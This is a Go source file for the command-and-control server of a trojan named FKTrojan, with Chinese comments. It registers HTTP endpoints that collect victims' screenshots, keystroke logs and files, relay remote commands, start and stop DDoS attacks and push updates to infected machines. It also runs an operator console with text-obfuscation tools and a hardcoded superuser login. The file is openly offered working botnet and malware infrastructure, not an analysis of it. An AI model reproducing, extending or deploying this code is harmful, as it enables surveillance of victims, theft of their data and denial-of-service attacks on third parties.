/*
Author: FreeKnight
服务器执行文件
* 肉鸡信息将被保存在数据库中
* 肉鸡控制命令将被保存在数据库中
* 肉鸡返还的文件，截图，按键信息等将保存在子目录下
* 控制面板使用的是 http://purecss.io/ 这里的CSS文件
*/
//------------------------------------------------------------
package main

//------------------------------------------------------------
import (
	"FKTrojan/server"
	"bufio"
	"database/sql"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"

	"FKTrojan/common"

	_ "github.com/go-sql-driver/mysql"
	"github.com/gorilla/mux"
)

//------------------------------------------------------------
// 路由分发
func backend() {
	router := mux.NewRouter()

	router.HandleFunc("/", server.IndexHandler)
	router.HandleFunc("/ip", server.IpHandler)
	router.HandleFunc("/ss", server.ScreenshotHandler)
	router.HandleFunc("/key", server.UserActionLogHandler)
	router.HandleFunc("/new", server.NewHandler).Methods("POST")
	router.HandleFunc("/sendcmd", server.SendCommandHandler).Methods("POST")
	router.HandleFunc("/cmdddos", server.StartDDosHandler).Methods("POST")
	router.HandleFunc("/stopddos", server.StopDDosHandler)
	router.HandleFunc("/panel", server.PanelHandler)
	router.HandleFunc("/purge", server.PurgeHandler)
	router.HandleFunc("/refresh", server.RefreshHandler)
	router.HandleFunc("/info", server.InfoHandler)
	router.HandleFunc("/login", server.LoginHandler).Methods("POST")
	router.HandleFunc("/logout", server.LogoutHandler)
	router.HandleFunc("/update", server.UpdateHandler).Methods("POST")
	router.HandleFunc("/command", server.CommandHandler)
	router.HandleFunc("/result", server.CommandResponseHandler)
	http.HandleFunc("/files/", server.ProfileFilesHandler)

	http.Handle("/", router)

	if server.UseSSL {
		err := http.ListenAndServeTLS(":"+server.MyPort, "server.crt", "server.key", nil) //:443
		if err != nil {
			server.FKLog("SSL Server Error: " + err.Error())
			fmt.Println("SSL Server Error: " + err.Error())
			os.Exit(0)
		}
	} else {
		http.ListenAndServe(":"+server.MyPort, nil)
	}
}

//------------------------------------------------------------
// 处理用户输入
// 若返回true则退出程序，返回false则重新等待输入
func dealWithInput() bool {
	fmt.Print("--> ")
	scan := bufio.NewScanner(os.Stdin)
	scan.Scan()

	switch scan.Text() {
	case "help":
		fmt.Println(" ")
		fmt.Println("===== HELP =====")
		fmt.Println("	help = Shows Help information.")
		fmt.Println("	mode = Enable and Disable Server Functions")
		fmt.Println("	status = List current server's status.")
		fmt.Println("	whoami = C&C local Address.")
		fmt.Println("	tools = C&C Tools.")
		fmt.Println("	refresh = Delete all client.")
		fmt.Println("	exit = Shutdown C&C server.")
		fmt.Println("===== HELP =====")
		fmt.Println(" ")
		return false
	case "whoami": // C&C 服务器本身的地址
		if server.UseSSL {
			fmt.Println("https://" + server.MyIP + ":" + server.MyPort + "/")
		} else {
			fmt.Println("http://" + server.MyIP + ":" + server.MyPort + "/")
		}
		return false
	case "refresh": // 刷新服务器状态,要清理数据库的
		fmt.Println(" ")
		fmt.Println("[!] WARNING: THIS IS DELETE EVERY CLIENTS TO THE SERVER! [!]")
		fmt.Println("[!] ALL CLIENTS NEED TO BE REGISTER! [!]")
		fmt.Println(" ")
		fmt.Println("Are you sure you want to do this?")
		fmt.Print("Yes/No: ")
		scan := bufio.NewScanner(os.Stdin)
		scan.Scan()
		switch scan.Text() {
		case "Yes":
		case "yes":
		case "YES":
			fmt.Print("SORRY, THIS FUNCTION HAVEN'T FINISHED.")
		default:
			return false
		}
		return false
	case "status": // 获取服务器状态
		s := strconv.Itoa(server.ClientCount())
		s1 := strconv.Itoa(server.AdminClientCount())
		s2 := strconv.Itoa(server.DBFilesCount())
		fmt.Println("[" + s + "] Total Clients in Database")
		fmt.Println("[" + s1 + "] Total Clients with Admin Rights in Database")
		fmt.Println("[" + s2 + "] Total Files in the Database")
		return false
	case "tools": // 一些便利工具
		fmt.Println(" ")
		fmt.Println("Tools")
		fmt.Println("md5 = MD5 HASH of Text.")
		fmt.Println("obfuscate = Obfuscate Text.")
		fmt.Println("common.Deobfuscate = Deobfuscate Text.")
		fmt.Println(" ")
		for {
			fmt.Println("Tool: pls choose your tools type. [back] to back main menu.")
			fmt.Print("--> ")
			scan := bufio.NewScanner(os.Stdin)
			scan.Scan()
			switch scan.Text() {
			case "md5":
				fmt.Print("Text: ")
				scan := bufio.NewScanner(os.Stdin)
				scan.Scan()
				fmt.Println("HASH: " + common.Md5Hash(scan.Text()))
			case "obfuscate":
				fmt.Print("Text: ")
				scan := bufio.NewScanner(os.Stdin)
				scan.Scan()
				fmt.Println("OBFUSCATED: " + common.Obfuscate(scan.Text()))
			case "deobfuscate":
				fmt.Print("Text: ")
				scan := bufio.NewScanner(os.Stdin)
				scan.Scan()
				fmt.Println("DEOBFUSCATED: " + common.Deobfuscate(scan.Text()))
			case "back":
				return false
			default:
				fmt.Println("[!] Unknown Tool! Pls use [md5] [obfuscate] or [deobfuscate] [!]")
			}
		}
		return false
	case "exit": // 退出本进程
		return true
	default:
		fmt.Println("[!] Unknown Command! Type 'help' for a list of commands. [!]")
	}
	return false
}

//------------------------------------------------------------
func main() {
	// 先丢个文件
	_ = server.CreateFile("./logs.txt")
	// 参数过少，连账号密码都不给
	if len(os.Args) < 2 {
		server.FKLog("[!] ERROR: Too less params. [!]")
		os.Exit(0)
	}
	// 尝试打开数据库
	var err error
	server.DBPointer, err = sql.Open("mysql", server.MySQLUser+":"+server.MySQLPass+"@"+server.MySQLHost+"/"+server.MySQLName)
	if err != nil {
		server.FKLog(fmt.Sprintf("[!] ERROR: CHECK MYSQL SETTINGS! ERROR : %v[!]", err))
		os.Exit(0)
	}
	defer server.DBPointer.Close()
	// 检查服务器是否开启
	err = server.DBPointer.Ping()
	if err != nil {
		server.FKLog(fmt.Sprintf("[!] ERROR: CHECK IF MYSQL SERVER IS ONLINE! ERROR : %v [!]", err))
		os.Exit(0)
	}
	// 使用超级密码（硬编码的root/bardman）或者数据库里存放的
	if !((os.Args[1] == server.ControlUser && common.Md5Hash(os.Args[2]) == server.ControlPass) ||
		(server.IsCanLoginByDB(os.Args[1], os.Args[2]))) {
		server.FKLog("[!] ERROR: ERROR ACCOUNT OR PASSWORD! [!]")
		os.Exit(0)
	}

	// 检查SSL证书
	if server.UseSSL {
		if !server.CheckFileExist("server.crt") || !server.CheckFileExist("server.key") {
			server.FKLog("[!] WARNING MAKE SURE YOU HAVE YOUR SSL FILES IN THE SAME DIR [!]")
		}
	}

	// 创建基本文件夹
	_ = server.CreateDir("./Profiles", 777)
	_ = server.CreateDir("./Builds", 777)
	// 生成随机种子
	rand.Seed(time.Now().UTC().UnixNano())

	// 开启后台线程
	go backend()

	// 开始的欢迎提示信息
	server.FKLog(server.Banner)
	server.FKLog(" ")
	server.FKLog("Welcome " + server.ControlUser + "!")
	server.FKLog("====================")
	server.FKLog("Current System Time: " + time.Now().Format(time.RFC850))
	server.FKLog("Last Login: " + server.GetLastLoginTime(false))
	server.FKLog("====================")
	_ = server.GetLastLoginTime(true)
	fmt.Println(" ")
	server.FKLog(server.ControlUser + " has logged in.")

	// 循环处理用户输入
	for {
		if dealWithInput() {
			break
		}
	}

	server.FKLog("[!] SERVER WILL EXIT. [!] ")
}
